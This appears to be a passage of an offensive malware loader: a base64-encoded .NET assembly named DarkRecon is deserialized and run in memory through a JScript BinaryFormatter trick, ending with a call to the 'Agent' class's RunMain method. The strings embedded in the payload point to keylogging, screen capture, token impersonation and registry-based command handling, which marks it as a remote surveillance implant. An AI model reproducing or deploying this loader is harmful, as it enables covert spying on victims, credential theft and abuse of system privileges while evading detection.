"ADABEAIIADQBFQIIADgBGgIIADwBHwIIAEABJAIIAEQBKQIIAEgBLgIIAEwBMwIIAFABOAIIAFQB"+
"PQIIAFgBQgIIAFwBRwIIAGABTAIIAGQBUQIIAGgBVgIIAGwBWwIIAHABYAIIAHQBZQIIAHgBagII"+
"AHwBbwIIAIABdAIIAIQBeQIIAIgBfgIIAIwBgwIIAJABiAIIAJQBjQIIAJgBkgIIAJwBlwIIAKAB"+
"nAIIAKQBoQIIAKgBpgIIAKwBqwIIALABsAIIALQBtQIIALgBugIIALwBvwIIAMABxAIIAMQByQII"+
"AMgBzgIIAMwB0wIIANQBKgEIANgBAgEIANwBLwEIAOABDAEIAOQBNAEIAOgBOQEIAOwBPgEIAPAB"+
"BwEIAPQBQwEIAPgBSAEIAPwBTQEIAAACUgEIAAQC8wAIAAgCVwEIAAwCXAEIABACYQEIABQCZgEI"+
"ABwCJQEIACACAgEIACQCDAEIACgCOQEIACwCBwEIADACSAEIADQCUgEIADgCVwEIADwCYQEIAEAC"+
"awEIAEQCdQEIAEgCfwEIAEwC2AIIAFAC3QIIAFQCiQEIAFgCkwEIAFwCnQEIAGACpwEIAGQCsQEI"+
"AGgCuwEIAGwCxQEIAHACzwEIAHQC2QEIAHgC3gEIAHwCoQIIAIAC4gIIAIQC5wIIAIgC7AIIAIwC"+
"8QIIAJAC9gIIAJQC+wIIAJgCAAMIAJwCBQMIAKACCgMIAKQCDwMIAKgCFAMIAKwCGQMIALACHgMI"+
"ALQCIwMuAAsAugMuABMAwwMuABsA4gMuACMA6wMuACsA+gMuADMA+gMuADsA+gMuAEMA6wMuAEsA"+
"AAQuAFMA+gMuAFsA+gMuAGMAGAQuAGsAQgRDAFsATwRgAnMAKgFDACgDGgByAJAAFQzxC/sLAQAI"+
"DAABDwCEAAEAAAERAMkOAQAAARMAzQ8BAAABFQAZDwIAAAEXAPcMAgAAARkATwACAAABGwDkDgIA"+
"AAEdAGIAAQAAAR8AdQACAAABIQDXDgIAAAEjAIcNAQBAASUAYQwDAEABJwDqCAQAQAEpAKoOBQAA"+
"ASsAdA4CAAABLQBsAAIAAAEvAH4AAQAEgAAAAQAAAAAAAAAAAAAAAACGDAAAAgAAAAAAAAAAAAAA"+
"4QBTCAAAAAACAAAAAAAAAAAAAADqAGwLAAAAAAIAAAAAAAAAAAAAAOEAXw4AAAAABAADAAUAAwAG"+
"AAMABwADAAAAAGtlcm5lbDMyAE1pY3Jvc29mdC5XaW4zMgBUb0ludDMyAFNNX1NFUlZFUlIyADxN"+
"b2R1bGU+AFNNX0NYSFRIVU1CAFNNX0NZVlRIVU1CAENyZWF0ZUNvbXBhdGlibGVEQwBSZWxlYXNl"+
"REMAQ3JlYXRlREMARGVsZXRlREMAR2V0REMAR2V0V2luZG93REMAU01fVEFCTEVUUEMAU01fU1lT"+
"VEVNRE9DS0VEAFNNX0lNTUVOQUJMRUQAU01fREJDU0VOQUJMRUQAU01fTUlERUFTVEVOQUJMRUQA"+
"TlVNUkVTRVJWRUQATUFYSU1VTV9BTExPV0VEAFNNX0NYTUlOSU1JWkVEAFNNX0NZTUlOSU1JWkVE"+
"AFNNX0NYTUFYSU1JWkVEAFNNX0NZTUFYSU1JWkVEAFNNX0NPTlZFUlRBQkxFU0xBVEVNT0RFAFNN"+
"X0NYRURHRQBTTV9DWUVER0UAU01fQVJSQU5HRQBTTV9DWEZJWEVERlJBTUUAU01fQ1lGSVhFREZS"+
"QU1FAFNNX0NYU0laRUZSQU1FAFNNX0NZU0laRUZSQU1FAFNNX0NYRExHRlJBTUUAU01fQ1lETEdG"+
"UkFNRQBTTV9DWEZSQU1FAFNNX0NZRlJBTUUAU01fU0xPV01BQ0hJTkUAU01fU0VDVVJFAFRPS0VO"+
"X0RVUExJQ0FURQBUT0tFTl9JTVBFUlNPTkFURQBTSVpFUEFMRVRURQBQREVWSUNFU0laRQBTTV9D"+
"WFNNU0laRQBTTV9DWVNNU0laRQBWRVJUU0laRQBTTV9DWE1FTlVTSVpFAFNNX0NZTUVOVVNJWkUA"+
"U01fQ1hTSVpFAFNNX0NZU0laRQBIT1JaU0laRQBTTV9DWERSQUcAU01fQ1lEUkFHAFNNX0NYTUlO"+
"U1BBQ0lORwBTTV9DWU1JTlNQQUNJTkcAU01fQ1hJQ09OU1BBQ0lORwBTTV9DWUlDT05TUEFDSU5H"+
"AFNNX0RFQlVHAFZSRUZSRVNIAFBIWVNJQ0FMV0lEVEgAZ2V0X0FTQ0lJAFNNX0NYTUlOVFJBQ0sA"+
"U01fQ1lNSU5UUkFDSwBTTV9DWE1BWFRSQUNLAFNNX0NZTUFYVFJBQ0sAU01fQ1hNRU5VQ0hFQ0sA"+
"U01fQ1lNRU5VQ0hFQ0sAU01fQ1hET1VCTEVDTEsAU01fQ1lET1VCTEVDTEsAU01fTkVUV09SSwBC"+
"SVRTUElYRUwAU01fQ1hIU0NST0xMAFNNX0NZSFNDUk9MTABTTV9DWFZTQ1JPTEwAU01fQ1lWU0NS"+
"T0xMAFdIX0tFWUJPQVJEX0xMAFNNX1JFTU9URUNPTlRST0wAU01fQ1hWSVJUVUFMU0NSRUVOAFNN"+
"X1hWSVJUVUFMU0NSRUVOAFNNX0NZVklSVFVBTFNDUkVFTgBTTV9ZVklSVFVBTFNDUkVFTgBTTV9D"+
"WEZVTExTQ1JFRU4AU01fQ1lGVUxMU0NSRUVOAFNNX0NYU0NSRUVOAFNNX0NZU0NSRUVOAFNNX0NY"+
"TUlOAFNNX0NZTUlOAFNNX0NYU01JQ09OAFNNX0NZU01JQ09OAFNNX0NYSUNPTgBTTV9DWUlDT04A"+
"RFJJVkVSVkVSU0lPTgBTTV9SRU1PVEVTRVNTSU9OAFBST0NFU1NfUVVFUllfSU5GT1JNQVRJT04A"+
"U01fQ1lTTUNBUFRJT04AU01fQ1lDQVBUSU9OAFNNX1NXQVBCVVRUT04AU01fU0hVVFRJTkdET1dO"+
"AFdNX1NZU0tFWURPV04AV01fS0VZRE9XTgBTeXN0ZW0uSU8AU01fQ1hQQURERURCT1JERVIAU01f"+
"Q1hGT0NVU0JPUkRFUgBTTV9DWUZPQ1VTQk9SREVSAFNNX0NYQk9SREVSAFNNX0NZQk9SREVSAFNN"+
"X01FRElBQ0VOVEVSAFNNX1NUQVJURVIAU01fRElHSVRJWkVSAFNNX0NYQ1VSU09SAFNNX0NZQ1VS"+
"U09SAFNNX1NIT1dTT1VORFMAU01fTUFYSU1VTVRPVUNIRVMATlVNQlJVU0hFUwBQTEFORVMAQ09M"+
"T1JSRVMAREVTS1RPUFZFUlRSRVMAREVTS1RPUEhPUlpSRVMATlVNUEVOUwBTTV9DTU9VU0VCVVRU"+
"T05TAFNIQURFQkxFTkRDQVBTAExJTkVDQVBTAENVUlZFQ0FQUwBQT0xZR09OQUxDQVBTAENMSVBD"+
"QVBTAFJBU1RFUkNBUFMAVEVYVENBUFMATlVNTUFSS0VSUwBOVU1DT0xPUlMAU01fQ01PTklUT1JT"+
"AFRPS0VOX0lORk9STUFUSU9OX0NMQVNTAFRPS0VOX0FMTF9BQ0NFU1MAUFJPQ0VTU19BTExfQUND"+
"RVNTAE5VTUZPTlRTAFNNX1BFTldJTkRPV1MAU01fU0FNRURJU1BMQVlGT1JNQVQAUkVDVABQSFlT"+
"SUNBTEhFSUdIVABTTV9NRU5VRFJPUEFMSUdOTUVOVABCTFRBTElHTk1FTlQAU01fTU9VU0VQUkVT"+
"RU5UAFNNX01PVVNFV0hFRUxQUkVTRU5UAFNNX01PVVNFSE9SSVpPTlRBTFdIRUVMUFJFU0VOVABT"+
"TV9DTEVBTkJPT1QAU01fQ1lNRU5VAFNNX0NZS0FOSklXSU5ET1cAU0NBTElOR0ZBQ1RPUlgATE9H"+
"UElYRUxTWABBU1BFQ1RYAFBIWVNJQ0FMT0ZGU0VUWABnZXRfWABURUNITk9MT0dZAFRPS0VOX1FV"+
"RVJZAFNDQUxJTkdGQUNUT1JZAExPR1BJWEVMU1kAQVNQRUNUWQBQSFlTSUNBTE9GRlNFVFkAQVNQ"+
"RUNUWFkAZ2V0X1kAdmFsdWVfXwBscEluaXREYXRhAG1zY29ybGliAGhEYwBoZGMAU3lzdGVtTWV0"+
"cmljAHhTcmMAeVNyYwBUb2tlblNlc3Npb25JZABwcm9jZXNzSWQAVGhyZWFkAHBpZABoV25kAGh3"+
"bmQAbHBzekRldmljZQBUb2tlblNlc3Npb25SZWZlcmVuY2UAaGRjU291cmNlAFRva2VuU291cmNl"+
"AEZyb21JbWFnZQBDbG9zZUhhbmRsZQBUb2tlbkhhbmRsZQBQcm9jZXNzSGFuZGxlAGJJbmhlcml0"+
"SGFuZGxlAGhhbmRsZQBSZWN0YW5nbGUAZ2V0X05hbWUATG9jYWxNYWNoaW5lAFZhbHVlVHlwZQBU"+
"b2tlblR5cGUARGlzcG9zZQBJbXBlcnNvbmF0ZQBpbXBlcnNvbmF0ZQBHdWlkQXR0cmlidXRlAERl"+
"YnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmli"+
"dXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1"+
"dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRy"+
"aWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRy"+
"aWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRl"+
"AFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN1cHByZXNzVW5tYW5hZ2VkQ29kZVNlY3Vy"+
"aXR5QXR0cmlidXRlAEdldFZhbHVlAFNldFZhbHVlAFNhdmUARGFya1JlY29uLmV4ZQBnZXRfU2l6"+
"ZQBnZXRfUG5nAFN5c3RlbS5UaHJlYWRpbmcARW5jb2RpbmcAU3lzdGVtLkRyYXdpbmcuSW1hZ2lu"+
"ZwBUb0Jhc2U2NFN0cmluZwBUb1N0cmluZwBTeXN0ZW0uRHJhd2luZwBnZXRfV2lkdGgAbldpZHRo"+
"AFdpbkFwaQBSZWdpc3RyeUtleVBlcm1pc3Npb25DaGVjawBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNp"+
"cGFsAFRva2VuRGVmYXVsdERhY2wAVG9rZW5JbXBlcnNvbmF0aW9uTGV2ZWwAZ2RpMzIuZGxsAGFk"+
"dmFwaTMyLmRsbABrZXJuZWwzMi5kbGwAdXNlcjMyLmRsbABNZW1vcnlTdHJlYW0AU3lzdGVtAGJv"+
"dHRvbQBFbnVtAENvcHlGcm9tU2NyZWVuAGdldF9QcmltYXJ5U2NyZWVuAE9wZW5Qcm9jZXNzVG9r"+
"ZW4AUnVuTWFpbgBUb2tlbk9yaWdpbgBEYXJrUmVjb24AU2VjdXJpdHlJbXBlcnNvbmF0aW9uAENv"+
"cHlQaXhlbE9wZXJhdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBFeGNlcHRpb24AVW5kbwBleGNlcHRp"+
"b25JbmZvAFplcm8ARGV2aWNlQ2FwAENyZWF0ZUNvbXBhdGlibGVCaXRtYXAAU2xlZXAAc2xlZXAA"+
"Ym1wAHJvcAB0b3AAVG9rZW5QcmltYXJ5R3JvdXAAU3RyaW5nQnVpbGRlcgBUb2tlbk93bmVyAFRv"+
"a2VuVXNlcgBscHN6RHJpdmVyAC5jdG9yAC5jY3RvcgBJbnRQdHIAcHRyAEdyYXBoaWNzAEdldFN5"+
"c3RlbU1ldHJpY3MAVG9rZW5TdGF0aXN0aWNzAFN5c3RlbS5EaWFnbm9zdGljcwBUb2tlblJlc3Ry"+
"aWN0ZWRTaWRzAGdldF9Cb3VuZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3Rl"+
"bS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAVG9rZW5Hcm91cHNBbmRQ"+
"cml2aWxlZ2VzAFRva2VuUHJpdmlsZWdlcwBHZXRCeXRlcwBhcmdzAFN5c3RlbS5XaW5kb3dzLkZv"+
"cm1zAEdldERldmljZUNhcHMAVG9rZW5Hcm91cHMARGVzaXJlZEFjY2VzcwBwcm9jZXNzQWNjZXNz"+
"AE9wZW5Qcm9jZXNzAENvbmNhdABJbWFnZUZvcm1hdABHZXRXaW5kb3dSZWN0AERlbGV0ZU9iamVj"+
"dABTZWxlY3RPYmplY3QAcmVjdABsZWZ0AGdldF9IZWlnaHQAbkhlaWdodAByaWdodABFeGl0AEJp"+
"dEJsdABBZ2VudABFbnZpcm9ubWVudABHZXRDdXJyZW50AEdldFNjcmVlblNob3QAVG9rZW5TYW5k"+
"Qm94SW5lcnQAQ29udmVydABoZGNEZXN0AGhEZXN0AHdEZXN0AHhEZXN0AHlEZXN0AGxwc3pPdXRw"+
"dXQAa2V5bG9nb3V0cHV0AFN5c3RlbS5UZXh0AFdpbmRvd3NJbXBlcnNvbmF0aW9uQ29udGV4dABj"+
"b250ZXh0AEdldERlc2t0b3BXaW5kb3cAc21JbmRleABuSW5kZXgAVG9BcnJheQBUb2tlbkF1ZGl0"+
"UG9saWN5AE9wZW5TdWJLZXkAUmVnaXN0cnlLZXkAY29tbWFuZGtleQBiYXNla2V5AGtleWxvZ2tl"+
"eQBydW5rZXkAcmVzdWx0a2V5AGFyZ3VtZW50a2V5AHNjcmVlbnNob3RrZXkAUmVnaXN0cnkAb3Bf"+
"RXF1YWxpdHkAb3BfSW5lcXVhbGl0eQBTeXN0ZW0uU2VjdXJpdHkAV2luZG93c0lkZW50aXR5AAAB"+
"ABdpAG0AcABlAHIAcwBvAG4AYQB0AGUAABVzAGMAcgBlAGUAbgBzAGgAbwB0AAATawBlAHkAbABv"+
"AGcAZwBlAHIAABVwAG8AdwBlAHIAcwBoAGUAbABsAAARbQBpAG0AaQBrAGEAdAB6AAANcgBlAHYA"+
"ZQByAHQAAB1pAG0AcABlAHIAcwBvAG4AYQB0AGUAZAA6ACAAAClpAG0AcABlAHIAcwBvAG4AYQB0"+
"AGkAbwBuACAAZgBhAGkAbABlAGQAAA9zAHUAYwBjAGUAcwBzAAAncwBjAHIAZQBlAG4AcwBoAG8A"+
"dAAgAGYAYQBpAGwAZQBkADoAIAAAGXIAZQB2AGUAcgB0AGUAZAB0AG8AOgAgAAAAAABYe+NCgYCh"+
"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"+
"AAAAAAAAAAEAAQAAADgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEA"+
"AQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAKwDAACQYAAAHAMAAAAAAAAAAAAAHAM0AAAAVgBT"+
"AF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8A"+
"AAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAA"+
"ACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBnAEYA"+
"aQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0AZQBu"+
"AHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA8AAoAAQBGAGkA"+
"bABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARABhAHIAawBSAGUAYwBvAG4AAAAwAAgAAQBG"+
"AGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA8AA4AAQBJAG4AdABlAHIA"+
"bgBhAGwATgBhAG0AZQAAAEQAYQByAGsAUgBlAGMAbwBuAC4AZQB4AGUAAABIABIAAQBMAGUAZwBh"+
"AGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAxADcA"+
"AAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEQADgABAE8AcgBp"+
"AGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABEAGEAcgBrAFIAZQBjAG8AbgAuAGUAeABlAAAA"+
"NAAKAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABEAGEAcgBrAFIAZQBjAG8AbgAAADQACAAB"+
"AFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMA"+
"cwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAALxjAADqAQAAAAAA"+
"AAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCIgc3RhbmRhbG9uZT0i"+
"eWVzIj8+DQoNCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20u"+
"djEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0i"+
"MS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0i"+
"dXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAg"+
"IDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFz"+
"bS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2Vy"+
"IiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8"+
"L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+AAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAEAAAAwAAAD0OgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAEBAAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXph"+
"dGlvbkhvbGRlcgYAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpNZW1i"+
"ZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAAMIDVN5c3RlbS5UeXBlW10JCwAAAAkHAAAACQoA"+
"AAAGEAAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSwgQnl0ZVtdKQgA"+
"AAAKAQUAAAAEAAAABhEAAAAIVG9TdHJpbmcJBwAAAAYTAAAADlN5c3RlbS5Db252ZXJ0BhQAAAAl"+
"U3lzdGVtLlN0cmluZyBUb1N0cmluZyhTeXN0ZW0uT2JqZWN0KQgAAAAKAQwAAAACAAAABhUAAAAv"+
"U3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuTWVzc2FnaW5nLkhlYWRlckhhbmRsZXIJBwAAAAoJBwAA"+
"AAkTAAAACREAAAAKCwAA";
var entry_class = 'Agent';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	o.RunMain('BASE_PATH', 'INIT_KEY', 'COMMAND_KEY', 'COMMAND_ARG_KEY', 'COMMAND_RESULT_KEY', 'KLSTORE_KEY', 'SCSTORE_KEY');
	
} catch (e) {
    debug(e.message);
}
'@